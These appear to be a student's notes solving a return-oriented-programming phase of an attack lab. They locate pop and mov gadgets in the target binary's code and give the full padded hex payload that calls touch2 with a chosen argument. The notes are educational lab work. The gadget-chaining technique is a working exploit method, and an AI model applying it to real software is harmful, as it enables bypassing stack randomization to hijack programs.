We now have a real randomized stack pointer, cannot use basic buffer overflow
Use gadgets !

We want to do 
movq $0x50fa73aa, %rdi
before calling touch2 which is at 0x4016e2

To do so we write on the stack

SomeCoolAddressDoing pop %rdi before ret
$0x50fa73aa
TheAddressOfTouch2


Doing such a pop is just : 5f
Then it will pop 64bits: aa 73 fa 50 00 00 00 00
Then e2 16 40 00 00 00 is the return address to touch2

Let's find the gadget now (5f c3)

hexdump rtarget > rtarget.hex
--> Almost no 5f

I found this gadget:

0000000000401867 <addval_164>:
  401867:	8d 87 58 90 90 c3    	lea    -0x3c6f6fa8(%rdi),%eax
  40186d:	c3     

The address 401869 is perfect! (90 is a nop)
It pops the value to 8 = rax

We need to move it then to rdi: 48 89 c7

This is found here:
000000000040186e <setval_376>:
  40186e:	c7 07 c0 48 89 c7    	movl   $0xc78948c0,(%rdi)
  401874:	c3   

Address 401871

We recall the stackpointer is shifted by 24: sub    $0x18,%rsp, so we need to pad the string

Finally I need to enter:

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
69 18 40 00 00 00 00 00
aa 73 fa 50 00 00 00 00
71 18 40 00 00 00 00 00
e2 16 40 00 00 00 00 00


